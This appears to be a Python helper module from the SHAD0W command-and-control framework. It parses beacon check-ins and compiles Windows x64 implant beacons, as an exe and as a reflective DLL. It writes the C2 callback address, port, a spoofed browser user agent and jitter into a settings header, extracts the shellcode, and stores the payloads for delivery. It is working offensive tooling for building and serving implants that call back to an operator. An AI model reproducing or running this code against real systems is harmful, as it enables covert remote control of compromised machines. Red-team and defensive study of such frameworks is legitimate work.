import os
import sys
import json
import time
import random
import hashlib
from pathlib import Path
from datetime import datetime

from lib import buildtools

# list all command scripts in the commands dir, append to list of commands
def get_commands():
    commandList = []
    for _, _, f in os.walk("/root/shad0w/lib/commands/"):
        for file in f:
            if file.endswith(".py") and "_" not in file:
                commandList.append(file.replace(".py",""))
    return commandList

def generate_beacon_id():
    # get md5 hash of the current date + time
    return hashlib.md5(str(datetime.now()).encode()).hexdigest()

def get_data_from_json(jdata):
    # get the data from data

    id     = ""
    opcode = 0
    data   = ""

    # if we get any errors, just return the above values
    # and this req will then be ignored
    try:
        id = jdata['id']
        if jdata['opcode']:
            opcode = jdata['opcode']
            if jdata['data']:
                data = jdata['data']
    except KeyError:
        pass

    # print("reting: ", (id, opcode, data))

    return id, opcode, data

async def compile_and_store_static(shad0w):
    # compile a static secure beacon and store it in memory

    shad0w.payloads["x64_secure_static"] = {}

    arch     = "x64"
    platform = "windows"
    secure   = "secure"
    static   = "static"

    # basically just make a random string
    dir_name       = generate_beacon_id()
    lib_dir_name   = "/tmp/" + dir_name + "/lib/"
    build_dir_name = "/tmp/" + dir_name + "/build/"

    Path(lib_dir_name).mkdir(parents=True, exist_ok=True)
    Path(build_dir_name).mkdir(parents=True, exist_ok=True)

    mod_name       = f"{build_dir_name}../beacon.exe"

    os.system(f"cp -r /root/shad0w/beacon/lib/* {lib_dir_name}")

    # clone the source files into the temp dir
    buildtools.clone_source_files(rootdir="injectable", builddir=build_dir_name)

    # set the settings
    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _CALLBACK_JITTER %s000
#define IMPERSONATE_SESSION \"%s\"""" % (shad0w.endpoint, shad0w.addr[1], 1, None)

    # write the new settings
    buildtools.update_settings_file(None, custom_template=settings_template, custom_path=build_dir_name + "/settings.h")

    # do the compile
    buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static, builddir=build_dir_name, modlocation=mod_name)

    # read the exe into memory
    with open(mod_name, "rb") as file:
        shad0w.payloads["x64_secure_static"]["exe"] = file.read()

    # read the shellcode into memory
    shad0w.payloads["x64_secure_static"]["bin"] = buildtools.extract_shellcode(beacon_file=mod_name)

    return

async def compile_and_store_static_srdi(shad0w):
    # compile a static secure beacon and store it in memory

    shad0w.payloads["x64_secure_static_srdi"] = {}

    arch     = "x64"
    platform = "windows"
    secure   = "secure"
    static   = "static"

    # basically just make a random string
    dir_name       = generate_beacon_id()
    lib_dir_name   = "/tmp/" + dir_name + "/lib/"
    build_dir_name = "/tmp/" + dir_name + "/build/"

    Path(lib_dir_name).mkdir(parents=True, exist_ok=True)
    Path(build_dir_name).mkdir(parents=True, exist_ok=True)

    mod_name       = f"{build_dir_name}../beacon.dll"

    os.system(f"cp -r /root/shad0w/beacon/lib/* {lib_dir_name}")

    # clone the source files into the temp dir
    buildtools.clone_source_files(rootdir="reflection", builddir=build_dir_name)

    # set the settings
    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _CALLBACK_JITTER %s000""" % (shad0w.endpoint, shad0w.addr[1], 1)

    # write the new settings
    buildtools.update_settings_file(None, custom_template=settings_template, custom_path=build_dir_name + "/settings.h")

    # do the compile
    buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static, builddir=build_dir_name, modlocation=mod_name)

    # read the exe into memory
    with open(mod_name, "rb") as file:
        shad0w.payloads["x64_secure_static_srdi"]["dll"] = file.read()

    # read the shellcode into memory
    shad0w.payloads["x64_secure_static_srdi"]["bin"] = buildtools.extract_shellcode(beacon_file=mod_name, srdi=True)

    # say we finished compiling an quit
    shad0w.compile_finished = True
    return

def loading_banner(shad0w):
    while shad0w.compile_finished != True:
        loading = list("Starting SHAD0W C2...")
        iter = 1
        colour = random.choice([1,2,3,4,5,6])
        for i in loading:
            if shad0w.compile_finished == True: break
            time.sleep(0.15)

            i = f"\033[1;3{colour}m" + i + "\033[0m"

            sys.stdout.write("[*] " + f"\033[1;3{colour}m" + ''.join(loading[:iter - 1]) + "\033[0m" + i + ''.join(loading[iter:]) + "\r")
            sys.stdout.flush()
            iter += 1

    sys.stdout.write("\r" + " "*100 + "\r")
    sys.stdout.flush()

    shad0w.screen_finish = True